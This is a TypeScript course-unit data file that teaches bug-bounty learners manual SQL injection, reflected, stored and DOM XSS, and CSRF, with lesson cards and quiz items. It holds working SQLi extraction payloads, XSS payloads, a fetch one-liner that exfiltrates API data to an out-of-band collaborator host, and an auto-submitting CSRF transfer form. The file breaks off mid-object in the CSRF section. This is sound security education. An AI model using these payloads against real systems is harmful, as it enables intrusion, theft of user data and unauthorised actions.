import type { Unit } from "../types";

const unit5: Unit = {
  id: "injection",
  index: 5,
  title: "Injection: SQLi & XSS",
  tagline: "The two bug classes that still, in 2026, pay more bounties than anything else.",
  tone: "offense",
  lessons: [
    {
      id: "sqli-manual",
      title: "SQL injection, by hand",
      summary: "Detect, confirm, extract — without sqlmap.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Given a web parameter that reaches a database query, decide whether it is injectable, confirm it with evidence (not a guess), and explain — in plain language — why the payload works.",
            "You will also learn to stop at proof-of-concept rather than extracting real user data, because that distinction decides whether a bug bounty report is rewarded or rejected (and whether it's legal).",
          ],
        },
        {
          kind: "intuition",
          title: "Why this bug exists at all",
          body: [
            "Think of a mail-merge letter template: 'Dear {{name}}, your balance is {{balance}}.' The program that fills it in trusts that {{name}} is just a name. If someone's 'name' field actually contains more template syntax, and the mail-merge tool blindly pastes it into the template before processing it, that pasted text becomes part of the instructions, not just data.",
            "SQL injection is that exact mistake, except the 'template' is a database query and the 'instructions' are SQL code. The analogy breaks down in one way: a mail-merge mistake usually just prints garbage. A SQL query is actively *executed* by the database, so the consequence is not garbled text — it's an attacker rewriting what the database does.",
          ],
        },
        {
          kind: "prereq",
          title: "Prerequisite: how a web app talks to a database",
          body: [
            "A relational database stores data in TABLES — think spreadsheets with named columns. A `users` table might have columns `id`, `username`, `password_hash`, `role`, and one ROW per user.",
            "`SELECT column1, column2 FROM table WHERE condition` reads rows: SELECT says which columns to return, FROM says which table, WHERE filters which rows (e.g. `WHERE id = 5` returns only the row where id equals 5).",
            "A typical login checks a submitted username/password by building a query from user input, like: `SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2'`. The quotes mark where a text value starts and ends — exactly like `{{name}}` in the mail-merge example.",
            'Crucially: the web app usually builds this query by gluing strings together. If `alice` above was typed by the visitor, and the app does `"SELECT * FROM users WHERE username = \'" + input + "\'"`, then whatever the visitor types becomes part of the SQL *text*, not just a value plugged into a fixed slot.',
          ],
          code: `// A naive login query, built with string concatenation:
query = "SELECT * FROM users WHERE username = '" + input + "' AND password = '" + pass + "'"

// If input is just a name, e.g. alice:
SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2'

// But input is just text the browser sent — nothing stops it containing a quote.`,
          check: {
            type: "mc",
            q: "In `SELECT username, role FROM users WHERE id = 5`, what does the WHERE clause do?",
            options: [
              "Chooses which columns are returned",
              "Chooses which table is read",
              "Filters which rows are included in the result",
              "Sorts the results",
            ],
            answer: 2,
            why: [
              "Column selection is the SELECT list (username, role), not WHERE.",
              "The table is named after FROM.",
              "Correct — WHERE keeps only rows matching the condition, here only the row with id = 5.",
              "Sorting is a separate ORDER BY clause.",
            ],
            explain: "WHERE is a row filter: it decides which rows out of the whole table are included in the answer.",
          },
        },
        {
          kind: "explain",
          title: "Where the quote breaks things",
          body: [
            "Because the app glues your raw text into the query string, a quote character (`'`) you type ends the string early, as far as the SQL parser is concerned — everything after it is now read as SQL *code*, not data.",
            "That is injection: user-supplied DATA is being interpreted as part of the program's CODE, because the two were never kept separate. This is the same root cause behind XSS later in this unit, and command injection in the extra lessons — only the 'language' being polluted changes (SQL vs HTML/JS vs shell).",
            "Typed `'` into a field and the page now shows a database error mentioning 'syntax error near...'? That's not proof of a working exploit yet — it only shows your character reached the query unescaped. The next step is to show you can *change the query's logic*, which is what the boolean pair test does.",
          ],
          code: `# What the app builds if you type a single quote as the username:
SELECT * FROM users WHERE username = '''' AND password = '...'
                                        ^ your quote prematurely closed the string
                                          → the rest is now malformed SQL → syntax error`,
        },
        {
          kind: "example",
          title: "Worked example: confirming with a boolean pair",
          body: [
            "Goal: prove the parameter changes query LOGIC, not just that it causes an error (errors can come from many unrelated bugs).",
            "Step 1 — baseline: request `?id=1`. Page shows product #1. Normal.",
            "Step 2 — true condition: request `?id=1' AND '1'='1`. This makes the query read `WHERE id = '1' AND '1'='1'`. `'1'='1'` is always true, so the row for id=1 is still returned (page looks identical to baseline — expected, this just proves the syntax didn't break).",
            "Step 3 — false condition: request `?id=1' AND '1'='2`. Now the query reads `WHERE id = '1' AND '1'='2'`, which is always false — the row should NOT be returned.",
            "Result: the true-condition page shows the product, the false-condition page shows nothing. The only difference between the two requests is `'1'='1'` vs `'1'='2'` — text the attacker controls. Because that difference flips the page's behaviour, the parameter is proven to be interpreted as SQL logic, not inert text. This is a CONFIRMED finding, with before/after evidence you can screenshot.",
          ],
          code: `?id=1' AND '1'='1     → WHERE id = '1' AND '1'='1'   (true)  → product shown
?id=1' AND '1'='2     → WHERE id = '1' AND '1'='2'   (false) → "no results"

Numeric parameters (no surrounding quotes in the query) use the same idea without a quote:
?id=1 AND 1=1          → product shown
?id=1 AND 1=2          → no results`,
        },
        {
          kind: "explain",
          title: "Extraction once confirmed: UNION",
          body: [
            "`UNION SELECT` appends a second, attacker-chosen result set onto the original query's output — useful when the page reflects query results back to you.",
            "It only works if both SELECTs return the same number of columns, so step 1 is always finding that count: increase `ORDER BY N` (sort by the Nth column) until it errors — the last N that worked is the column count.",
            "Then replace a column with something informative: `version()`, `current_user()`, and eventually `information_schema.tables` / `.columns` (a built-in catalog every SQL database keeps, listing every table and column name) to map out what's there before touching real data.",
          ],
          code: `?id=1' ORDER BY 1-- -   OK
?id=1' ORDER BY 2-- -   OK
?id=1' ORDER BY 3-- -   error  → exactly 2 columns in the original query

?id=1' UNION SELECT NULL,NULL-- -                     sanity check, should render
?id=1' UNION SELECT 1,version()-- -                   DB banner appears where column 2 rendered
?id=1' UNION SELECT 1,table_name FROM information_schema.tables-- -
?id=1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- -
?id=1' UNION SELECT 1,password FROM users WHERE id=1-- -   ← proves capability; stop here for a report.
# "-- -" starts a SQL comment, silencing anything the original query had after our injection point.`,
          check: {
            type: "fill",
            q: "You try `ORDER BY 3` and get an error, but `ORDER BY 2` was fine. How many columns does the query return?",
            answers: ["2", "two"],
            hints: ["The error means column 3 doesn't exist.", "The last ORDER BY that worked tells you the count."],
            explain:
              "ORDER BY N fails once N exceeds the number of columns, so the last successful N is the column count — here, 2.",
          },
        },
        {
          kind: "explain",
          title: "Blind SQLi: when nothing is reflected",
          body: [
            "If there's no visible output and no error on screen, you can't read data directly — but you can still ask the database yes/no questions and read the answer through a side effect.",
            "Boolean blind: inject a condition like `AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'` — if the page behaves differently (different content, length, status) when true vs false, you've learned one character at a time.",
            "Time blind: when even the page behaviour doesn't change, use `AND IF(condition, SLEEP(5), 0)` — a 5-second delay confirms 'true' purely from timing, no visible difference needed.",
            "Because this is character-by-character guessing, it's normally automated (e.g. sqlmap) once you've manually confirmed the injection exists and you're acting within your own authorised test account/scope.",
          ],
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Mistaking a generic 500 error for 'confirmed SQLi' — many bugs throw 500s. Confirmation requires showing the query's LOGIC changed (the boolean-pair test), not just that something broke.",
            "Treating client-side form validation (`maxlength`, JS regex) as a defense — it only shapes what polite users type; an attacker sends raw HTTP requests that skip the browser's form entirely.",
            "Dumping full tables of real user data for a report 'to be thorough' — this turns a legitimate finding into unauthorised data access, which can void a bounty and create legal exposure. Prove capability with `version()`/`current_user()`/one record, then stop.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "A `/profile?uid=7` page returns your profile normally. `uid=7 AND 1=1` also returns your profile. `uid=7 AND 1=2` returns 'profile not found'. Is this confirmed SQLi, and why — specifically, what rules out 'the app just validates uid is numeric and rejected my input'?",
          ],
          check: {
            type: "mc",
            q: "What confirms this is genuine SQLi rather than input validation rejecting the request?",
            options: [
              "The 'AND 1=2' request returned an HTTP error page instead of 200",
              "'AND 1=1' behaves exactly like the untouched baseline (still 200, profile shown), while only the logically-false variant changes behaviour — both are syntactically similar extra text",
              "The server took a long time to respond",
              "You can't tell without source code access",
            ],
            answer: 1,
            why: [
              "An HTTP error alone doesn't distinguish validation rejection from SQL logic — you need the paired comparison.",
              "Correct — if validation were just blocking anything non-numeric, BOTH payloads (which both contain letters/spaces) would be rejected identically. The fact that only the false one changes the result shows the database itself is evaluating the condition.",
              "Response time differences are the signature of time-based blind testing, not relevant here.",
              "Black-box behavioural evidence like this is exactly how confirmation works without source access.",
            ],
            explain:
              "The key reasoning move: if a WAF or input filter were simply blocking 'weird' input, it would block both payloads equally since both contain non-numeric characters. Only a real SQL evaluation explains why true vs false diverge.",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "A confirmed SQLi (boolean pair divergence, or a UNION pulling `version()`) proves the parameter reaches the database unsanitised and that you can influence query logic — that alone is reportable.",
            "It does NOT automatically prove 'full database compromise' — actual impact (what tables are reachable, whether it's a read-only reporting replica, whether WAFs block deeper extraction) needs to be demonstrated, not assumed, and only within your authorised scope/account.",
            "The fix you'll see in modern code is the PARAMETERISED QUERY — the database driver keeps your data and its SQL code in separate channels, so a quote in your input can never be read as syntax (e.g. `db.query('SELECT * FROM users WHERE id = $1', [id])`). You'll still find raw concatenation in legacy endpoints, dynamic ORDER BY/table names, and report/export features.",
          ],
          tone: "defense",
        },
      ],
      exercises: [
        {
          type: "mc",
          ref: "Worked example: confirming with a boolean pair",
          q: "A parameter returns different page content for `AND 1=1` vs `AND 1=2`, with no error message on either request. What is the technique called?",
          options: ["UNION-based SQLi", "Boolean blind SQLi", "Time-based blind SQLi", "Second-order SQLi"],
          answer: 1,
          why: [
            "UNION-based requires reflecting a second SELECT's output, not just a true/false content difference.",
            "Correct — differing visible content (not errors, not timing) between a true and false condition is the definition of boolean blind SQLi.",
            "Time-based relies on a measured delay (e.g. SLEEP), not content differences.",
            "Second-order SQLi means the payload is stored and triggers later elsewhere — not what's described.",
          ],
          hints: [
            "No errors are mentioned, so rule out plain error-based detection.",
            "Nothing about timing is mentioned either.",
            "What's left when you have true/false content differences but no errors or timing?",
          ],
          explain:
            "Different content (not error codes, not timing) between a logically-true and logically-false injected condition is the signature of boolean blind SQLi.",
        },
        {
          type: "fill",
          ref: "Extraction once confirmed: UNION",
          q: "What clause do you increment (ORDER BY 1, 2, 3...) to find the number of columns in the original query before using UNION SELECT?",
          answers: ["order by", "order-by", "orderby"],
          hints: [
            "It's a normal SQL sorting clause, repurposed here.",
            "You increase the column number until it errors.",
          ],
          explain:
            "ORDER BY N sorts by the Nth column; once N exceeds the real column count it errors, so the last working N is the count your UNION SELECT must match.",
        },
        {
          type: "mc",
          ref: "What this proves — and doesn't",
          q: "You've confirmed SQLi on a bounty target. What should the proof-of-concept in your report include?",
          options: [
            "A full dump of the users table",
            "`version()` / `current_user()` output plus the exact payload and request used",
            "Just a sentence saying 'it's vulnerable'",
            "A brute-force of every table in the database",
          ],
          answer: 1,
          why: [
            "Dumping real user data turns a legitimate finding into unauthorised data access — risks the bounty and is likely out of scope/illegal.",
            "Correct — this proves database access and query control with minimal, non-sensitive output, reproducible by the triager.",
            "Too vague to be reproducible; triagers need exact requests to verify.",
            "Brute-forcing every table is noisy, unnecessary for proof, and may be against program rules.",
          ],
          hints: [
            "Think about the minimum evidence needed to prove the capability.",
            "What's the risk of touching real user data?",
          ],
          explain:
            "Prove the capability with innocuous output (DB version/current user) and the exact request — enough for a triager to reproduce without you having accessed sensitive data.",
        },
        {
          type: "order",
          ref: "Where the quote breaks things",
          q: "Order the steps of a manual SQLi test from first action to confirmed finding.",
          items: [
            "Send a baseline request and note the normal response",
            "Insert a single quote and look for a SQL error or broken output",
            "Send a logically-true payload (e.g. ' AND '1'='1) and compare to baseline",
            "Send a logically-false payload (e.g. ' AND '1'='2) and confirm the response changes",
          ],
          hints: [
            "You always need a baseline to compare against.",
            "A raw quote test comes before the boolean pair.",
            "True should look like baseline; false should differ.",
          ],
          explain:
            "Baseline first (know 'normal'), then a quote to find a candidate, then the true/false pair to prove the parameter controls SQL logic rather than just causing an error.",
        },
        {
          type: "mc",
          ref: "Prerequisite: how a web app talks to a database",
          q: 'An app builds a query as `"SELECT * FROM items WHERE name = \'" + input + "\'"`. Why is a quote character in `input` dangerous here?',
          options: [
            "Quotes are never allowed in HTTP requests",
            "The quote prematurely ends the string literal, so everything after it is parsed as SQL code instead of data",
            "It causes the server to crash the entire machine",
            "It triggers an automatic security alert",
          ],
          answer: 1,
          why: [
            "HTTP has no such restriction — quotes travel in requests just fine.",
            "Correct — the string literal that was meant to hold just the user's text closes early, and the rest of the input is now parsed as SQL syntax.",
            "A syntax error affects that one query/request, not the whole machine.",
            "There is no automatic alert built into SQL — that depends on separate monitoring the app may or may not have.",
          ],
          hints: [
            "Think about where a string literal in SQL starts and ends.",
            "What happens to the text that comes after the closing quote?",
          ],
          explain:
            "Because the app glued raw input straight into the query text, a quote in that input closes the string early and the remainder is read as SQL code — the core mechanism of injection.",
        },
      ],
    },
    {
      id: "xss-families",
      title: "XSS: reflected, stored, DOM",
      summary: "Three ways to make the victim's browser run your JavaScript.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Explain why a browser sometimes executes attacker-supplied text as code, tell apart reflected, stored, and DOM XSS from a request/response pair, and write a minimal non-destructive proof-of-concept for each.",
          ],
        },
        {
          kind: "intuition",
          title: "Why this bug exists at all",
          body: [
            "A browser is handed a stream of text (HTML) and told: 'some of this is content to display, some of it is markup describing structure, and some of it — inside `<script>` tags or certain attributes — is code to run'. It has to decide which is which as it reads.",
            "If a page builds its HTML by pasting user input directly into that stream — e.g. `<p>Welcome, ` + name + `</p>` — and the user's 'name' happens to contain `<script>...</script>`, the browser can't tell that text came from an untrusted visitor. It just sees `<script>` and runs it, exactly as if the site's own developer had written it.",
            "This is the same root cause as SQL injection — untrusted data and executable code sharing one channel — except the 'interpreter' is now the browser's HTML/JS engine instead of the database.",
          ],
        },
        {
          kind: "prereq",
          title: "Prerequisite: how a browser parses a page",
          body: [
            "When a browser receives an HTML response, it reads it top to bottom, converting tags like `<div>`, `<img>`, `<script>` into a tree of elements (the DOM). Anything between `<script>` tags — or inside certain event attributes like `onerror=`, `onload=` — is handed to the JavaScript engine to execute, not displayed as text.",
            "Plain text content (e.g. inside a `<p>` tag) is just displayed. The difference between 'displayed text' and 'executed code' is entirely about WHERE in the structure it appears — not about what the text contains. `<script>` anywhere in the HTML stream is code; `Hello <script>` as a literal string the user typed is also code, if the page didn't neutralise the `<` character first.",
            "'Neutralising' means HTML-ENCODING special characters before inserting user text into HTML: turning `<` into `&lt;`, `>` into `&gt;`, `\"` into `&quot;`. Encoded this way, a browser displays the literal characters `<script>` instead of treating them as a tag.",
          ],
          code: `// Page template, unsafe:
<p>Welcome, " + name + "</p>

// If a visitor sets name = <script>alert(1)</script>, the final HTML the browser receives is:
<p>Welcome, <script>alert(1)</script></p>
                 ^ the browser sees a real <script> tag here and runs it.

// If the app HTML-encodes first:
<p>Welcome, &lt;script&gt;alert(1)&lt;/script&gt;</p>
→ the browser displays the literal text "<script>alert(1)</script>" — inert.`,
          check: {
            type: "mc",
            q: "Why does HTML-encoding `<` as `&lt;` stop a script tag from executing?",
            options: [
              "It makes the text invisible",
              "The browser's parser only treats a real `<` character as the start of a tag — `&lt;` is displayed as the literal character instead",
              "It deletes the script tag",
              "It only works in old browsers",
            ],
            answer: 1,
            why: [
              "Encoded text is still displayed, just as literal characters, not hidden.",
              "Correct — encoding changes how the parser interprets the character, from 'start of markup' to 'literal text to display'.",
              "Nothing is deleted; the characters are still shown to the user, just not executed.",
              "This is standard, current behaviour in every modern browser.",
            ],
            explain:
              "HTML encoding doesn't hide or remove anything — it changes a character's role from 'markup' to 'content', so the parser never treats it as the start of a tag.",
          },
        },
        {
          kind: "explain",
          title: "The three families, and why the distinction matters",
          body: [
            "Reflected — the payload is in the request (e.g. a URL parameter) and echoed straight back in THAT SAME response. It only fires if a victim is tricked into clicking a crafted link, so impact depends on social engineering.",
            "Stored — the payload is saved server-side (a comment, a profile bio, a support ticket) and rendered later to OTHER visitors who view that content. No link-clicking trick needed — anyone who views the page is affected, which is why this is usually the highest severity.",
            "DOM — a client-side script itself reads attacker-controlled data (`location.hash`, `postMessage`, `localStorage`) and writes it unsafely into the page using JavaScript (e.g. `element.innerHTML = location.hash`). The server may never even see the payload, because `#fragment` text in a URL is never sent in the HTTP request — it stays in the browser.",
            "Telling them apart matters because it changes both exploitability (does an attacker need to trick one victim per request, or just post once?) and where the fix belongs (server-side output encoding vs. safe client-side DOM APIs).",
          ],
          tone: "offense",
        },
        {
          kind: "example",
          title: "Worked example: from probe to confirmed PoC",
          body: [
            "Step 1 — probe: you submit `<x1x2x3>` (a harmless, unmistakable string — not a real tag) into a search box and the page's HTML source shows it raw and unescaped, e.g. `<p>Results for <x1x2x3></p>` instead of `&lt;x1x2x3&gt;`. This is a LEAD: it shows your characters reached the HTML without encoding — not yet proof of execution.",
            "Step 2 — confirm execution: replace the probe with something the browser actually runs, e.g. `<img src=x onerror=alert(1)>`. The `src=x` is an invalid image URL, which triggers the `onerror` JavaScript handler. If an alert box pops up, the browser executed attacker-supplied JavaScript — this is CONFIRMED.",
            "Step 3 — classify: was this payload typed into the URL (`?q=...`) and reflected in that one response? Reflected. Was it saved (e.g. a comment) and later shown to a different visitor loading the page fresh? Stored. Did it only fire via a `#fragment` that a client-side script read and wrote into the page, without ever touching the server? DOM.",
            "Step 4 — for a report, replace `alert(1)` with evidence of real impact, e.g. reading `document.cookie` or performing an authenticated action — but only against your own test account, never a real user's.",
          ],
          code: `# Step 1 — probe (XSS lead, not proof)
?q=<x1x2x3>
→ page source contains: <p>Results for <x1x2x3></p>   (unescaped!)

# Step 2 — confirm with a payload the browser executes
?q=<img src=x onerror=alert(1)>
→ an alert box pops up                                  CONFIRMED

# Other common confirming payloads
<script>alert(1)</script>
<svg onload=alert(1)>
"><svg onload=alert(1)>          (breaks out of an HTML attribute first)
javascript:alert(1)              (used where input lands inside href= or src=)`,
          check: {
            type: "mc",
            q: "A search box reflects `<x1x2x3>` unescaped in the page source, but you haven't tried a real payload yet. What's the accurate status of this finding?",
            options: [
              "Confirmed XSS, ready to report",
              "A lead only — it shows your text isn't being encoded, but you haven't proven the browser will execute code yet",
              "Not a bug at all",
              "Confirmed SQL injection",
            ],
            answer: 1,
            why: [
              "Reporting before proving execution risks a false positive — many sinks display text but still block real tags/attributes.",
              "Correct — unescaped reflection is necessary but not sufficient; you still need a payload the browser actually executes (e.g. onerror=alert(1)) to confirm.",
              "It IS a meaningful lead worth following up, just not a confirmed vulnerability yet.",
              "This is an HTML/JS context issue, unrelated to SQL.",
            ],
            explain:
              "Mirror the SQLi lesson's lesson: an error or unusual behaviour is a LEAD. Confirmation requires demonstrating the actual impact — here, that means proving the browser executes injected JavaScript.",
          },
        },
        {
          kind: "explain",
          title: "Impact over shock value",
          body: [
            "`alert(1)` is the standard way to confirm execution, but it proves nothing about real-world impact on its own. For a report, describe what a realistic attacker could actually DO: read `document.cookie` (if not protected — see Unit 4's HttpOnly flag), call an authenticated API endpoint as the victim, or redirect to a credential-harvesting page.",
            "Against your own test account only, a stronger PoC reads a sensitive endpoint and exfiltrates the result out-of-band: `fetch('/api/me').then(r=>r.text()).then(x=>fetch('//your-collab-id.oastify.com/?x='+encodeURIComponent(x)))`. This demonstrates session-riding without ever touching a real victim.",
          ],
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Confusing 'reflected in page source' with 'executed'. Many frameworks escape by default in most contexts but miss one — always confirm with a payload that actually runs, not just text you can see.",
            "Assuming DOM XSS must be visible server-side in logs — because the payload can live entirely in the URL fragment (`#...`), it never reaches the server at all, so server logs are the wrong place to look for it.",
            "Treating a Content-Security-Policy header as proof XSS is impossible — CSP mitigates impact for many payload shapes but has known bypasses (unsafe-inline, JSONP endpoints under script-src 'self', DOM clobbering); it reduces risk, it doesn't eliminate the underlying bug.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "You post a comment containing `<svg onload=alert(1)>` on a forum. You view your own comment and the alert fires. A friend (different browser, different session) later loads the same page and also sees the alert fire. Classify this XSS, and explain the one observation that rules out 'reflected'.",
          ],
          check: {
            type: "mc",
            q: "Which observation rules out 'reflected' and confirms 'stored' here?",
            options: [
              "The alert box says '1'",
              "The payload fires for a different visitor (your friend), loading the page fresh, without them submitting anything themselves",
              "It used an <svg> tag instead of <script>",
              "The forum uses HTTPS",
            ],
            answer: 1,
            why: [
              "The alert's content is irrelevant to classification.",
              "Correct — reflected XSS only fires for the specific response triggered by a specific request; firing for an unrelated visitor who never submitted the payload themselves means it was SAVED and served to them — that's stored XSS.",
              "The tag choice (svg vs script) doesn't determine the family — it's about where the data is held and who triggers it.",
              "HTTPS is unrelated to whether a script executes once rendered.",
            ],
            explain:
              "Stored XSS is defined by persistence: once saved, it fires for any visitor who views that content later, with no link-clicking or re-submission required from them.",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "A confirmed XSS (a payload your browser actually executes) proves the application fails to neutralise user input before rendering it in a script-execution context — that's reportable.",
            "It does NOT by itself prove account takeover or data breach — that requires demonstrating a realistic impact chain (e.g. reading a session identifier that grants access), and must stay confined to your own test accounts and explicitly authorised scope.",
            "CSP (Content-Security-Policy) is the browser-level mitigation you'll meet constantly: it restricts which script sources the browser will execute, so a strict policy can prevent a found injection from having real impact even before the underlying bug is fixed.",
          ],
          tone: "defense",
        },
      ],
      exercises: [
        {
          type: "match",
          ref: "The three families, and why the distinction matters",
          q: "Match each XSS family to its defining characteristic.",
          pairs: [
            [
              "Reflected",
              "Payload is in the request and echoed back in that same response; needs a victim to click a crafted link",
            ],
            ["Stored", "Payload is saved server-side and later rendered to other visitors automatically"],
            [
              "DOM",
              "Payload (often in the URL fragment) is read and unsafely written to the page by client-side JavaScript; may never reach the server",
            ],
          ],
          hints: [
            "Which one needs the victim to click something?",
            "Which one affects every later visitor without any trick?",
            "Which one can avoid the server entirely?",
          ],
          explain:
            "Reflected needs a crafted link per victim; stored persists and hits everyone; DOM can be entirely client-side, sometimes invisible server-side.",
        },
        {
          type: "mc",
          ref: "Worked example: from probe to confirmed PoC",
          q: "`<x1x2x3>` echoes back unescaped in a page's HTML source. What should you do next, before treating this as confirmed?",
          options: [
            "Report it immediately as confirmed XSS",
            "Try a payload the browser actually executes, like `<img src=x onerror=alert(1)>`, and check whether it runs",
            "Assume it's a false positive and move on",
            "Buy a new domain to host the exploit",
          ],
          answer: 1,
          why: [
            "Unescaped reflection alone is a lead, not confirmation — some sinks display raw text but still block real tags/attributes from executing.",
            "Correct — confirming requires evidence the browser executed injected code, not just that text appeared unescaped.",
            "The lead is meaningful and worth following up before discarding it.",
            "Domain purchase is irrelevant to basic confirmation.",
          ],
          hints: ["What's the difference between 'text appeared' and 'code ran'?"],
          explain:
            "Confirmation requires a payload that demonstrably executes (e.g. triggers alert()), not just unescaped text in the page source.",
        },
        {
          type: "mc",
          ref: "The three families, and why the distinction matters",
          q: "A payload only fires when placed after `#` in the URL (`...#<img src=x onerror=alert(1)>`), and never appears anywhere in the server's HTTP logs. What family is this?",
          options: ["Reflected", "Stored", "DOM", "Second-order SQLi"],
          answer: 2,
          why: [
            "Reflected payloads appear in the request and would show up in server logs, since they're sent to the server.",
            "Stored requires saving the payload server-side, which also implies server awareness of it.",
            "Correct — `#fragment` text is never transmitted to the server; a client-side script must be reading it and writing it unsafely to the page, which is the definition of DOM XSS.",
            "SQLi is a different bug class entirely, about databases, not browsers.",
          ],
          hints: [
            "Recall which part of a URL the browser never sends to the server.",
            "If the server never saw it, where did the unsafe handling happen?",
          ],
          explain:
            "The URL fragment (after #) stays entirely client-side. A payload that fires from there, with no server-side trace, must be handled unsafely by client-side JavaScript — DOM XSS.",
        },
        {
          type: "fill",
          ref: "Prerequisite: how a browser parses a page",
          q: "What is it called when special HTML characters like `<` are converted to safe equivalents like `&lt;` before being inserted into a page?",
          answers: ["html encoding", "output encoding", "encoding", "html entity encoding", "escaping"],
          hints: [
            "It changes how the parser interprets a character, from markup to literal text.",
            "The term describes 'making output safe for its context'.",
          ],
          explain:
            "HTML (output) encoding converts characters with special meaning in HTML into literal, inert equivalents, so user text is displayed rather than parsed as markup or code.",
        },
        {
          type: "mc",
          ref: "Mistakes",
          q: "A site has a strict Content-Security-Policy header. Does this mean it has no XSS vulnerabilities?",
          options: [
            "Yes, CSP makes XSS impossible",
            "No — CSP mitigates the IMPACT of many payload shapes but doesn't fix the underlying unsanitised-input bug, and has known bypasses",
            "No, CSP has nothing to do with XSS",
            "Yes, as long as the site uses HTTPS",
          ],
          answer: 1,
          why: [
            "CSP reduces the blast radius of many payloads but is not a complete fix and has documented bypass techniques.",
            "Correct — CSP is a mitigation layered on top; the root cause (data/code mixing without encoding) can still exist underneath it.",
            "CSP is specifically designed to restrict script execution, directly relevant to XSS impact.",
            "HTTPS protects data in transit; it has no bearing on whether input is safely encoded into HTML.",
          ],
          hints: ["Is CSP a root-cause fix, or a mitigation layered on top?"],
          explain:
            "CSP restricts where scripts can execute from, reducing impact for many XSS payloads, but bypasses exist and the real fix is still proper output encoding at the source.",
        },
      ],
    },
    {
      id: "csrf",
      title: "CSRF, briefly",
      summary: "Making the victim's browser perform a state-changing request.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Explain why a browser automatically attaches cookies to cross-site requests, why that enables CSRF, and identify when modern defenses (SameSite, tokens) do or don't block it.",
          ],
        },
        {
          kind: "intuition",
          title: "Why this bug exists at all",
          body: [
            "Think of your session cookie as a stamped hand at a club: once stamped, any door in that building lets you through without re-checking ID, as long as you show the stamp. The browser is the one showing the stamp automatically, every time, to every request aimed at that club's address — it doesn't ask 'did YOU mean to walk through this door, or did someone else push you through it?'",
            "CSRF is exactly that: a malicious page (evil.example) makes your browser submit a request to a site you're logged into (bank.example). Your browser attaches your bank's session cookie automatically, because that's just how cookies work — they're not attached because YOU chose to, they're attached because the destination matches.",
          ],
        },
        {
          kind: "prereq",
          title: "Prerequisite: cookies are sent automatically",
          body: [
            "Recall from Unit 4 that a session cookie is how a site remembers you're logged in. Once set, the BROWSER (not the site) decides to attach it to every subsequent request to that site's domain — regardless of which page or script triggered the request.",
            "This means a form on a completely different website, if it points its `action` at your bank's URL, still causes your browser to include your bank cookie when that form is submitted — because from the browser's point of view, it's just 'a request going to bank.example', and the cookie rule is purely about the destination domain.",
          ],
        },
        {
          kind: "explain",
          title: "The classic attack",
          body: [
            "Victim is logged into bank.example (has a valid session cookie). Attacker gets them to visit evil.example — e.g. via a phishing link. The attacker's page contains a form that auto-submits to bank.example/transfer the moment the page loads, with the attacker's own account as the destination for the money.",
            "Because the victim's browser attaches the bank session cookie automatically (as described above), bank.example sees what looks like a perfectly legitimate, authenticated transfer request — it has no way to tell the request was triggered by evil.example rather than by the victim clicking 'Transfer' on the real site.",
          ],
          code: `<!-- hosted on evil.example -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
<!-- victim's browser sends this with their bank.example session cookie attached automatically -->`,
          tone: "offense",
        },
        {
          kind: "explain",
          title: "Why it often fails today",
          body: [
            "Modern Chrome/Firefox/Edge default new cookies to `SameSite=Lax`, meaning the cookie is withheld on cross-site POST/PUT/DELETE requests like the one above (top-level cross-site GET navigation is still allowed, for usability — e.g. following a normal link).",
            "On top of that, many apps add an explicit CSRF TOKEN — a random, unguessable value the server places in the real form and checks on submission. The attacker's forged form, hosted on a different origin, can't read that token (same-origin policy blocks it), so the forged request is missing it and gets rejected.",
          ],
          tone: "defense",
        },
        {
          kind: "example",
          title: "Worked example: spotting where it still works",
          body: [
            'You find an endpoint `GET /account/delete?confirm=yes` — a state-changing action (deleting an account) accepted via GET. Because GET requests can be triggered just by loading an image tag (`<img src="https://victim.example/account/delete?confirm=yes">`) on an attacker page, and GET requests are NOT blocked by SameSite=Lax\'s cross-site-POST restriction, this is exploitable even with modern cookie defaults.',
            "You also find a POST endpoint that reads its body as `Content-Type: text/plain` and has no CSRF token. Because `text/plain` is one of the 'simple' content types browsers allow to be set cross-site without a CORS preflight, an attacker's auto-submitting form can still trigger it (assuming SameSite isn't set to Strict and no token is required).",
          ],
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Assuming 'SameSite=Lax is default now, so CSRF is dead' — it blocks the classic cross-site-POST case, but GET-based state changes and misconfigured `SameSite=None` (common for intentionally cross-site widgets/iframes) remain exploitable.",
            "Confusing CSRF with XSS — CSRF forges a request using the victim's existing authenticated session without needing to run any JavaScript in the victim's origin; XSS actually executes attacker code inside the victim's origin. They're different root causes with different fixes.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "An app has `SameSite=Lax` cookies and no CSRF token. It exposes `POST /account/email` (change email) and `GET /account/export?format=csv` (download your data). Which of these two is still CSRF-exploitable under Lax, and why?",
          ],
          check: {
            type: "mc",
            q: "Which endpoint is still CSRF-exploitable under SameSite=Lax with no token?",
            options: [
              "POST /account/email, because POST is always more dangerous",
              "GET /account/export?format=csv, because SameSite=Lax still allows cookies on top-level cross-site GET requests",
              "Neither — Lax blocks everything cross-site",
              "Both, equally",
            ],
            answer: 1,
            why: [
              "POST is not inherently 'more dangerous' for this specific Lax-bypass reasoning — the key fact is which request types Lax still allows cookies on.",
              "Correct — Lax specifically still permits cookies on top-level, cross-site GET navigations (so normal links keep working); forging a cross-site POST, by contrast, is the case Lax was designed to block.",
              "Lax is a middle ground — it blocks cross-site POST but allows top-level GET, by design.",
              "Only the GET-triggerable one remains forgeable under Lax here; POST is blocked.",
            ],
            explain:
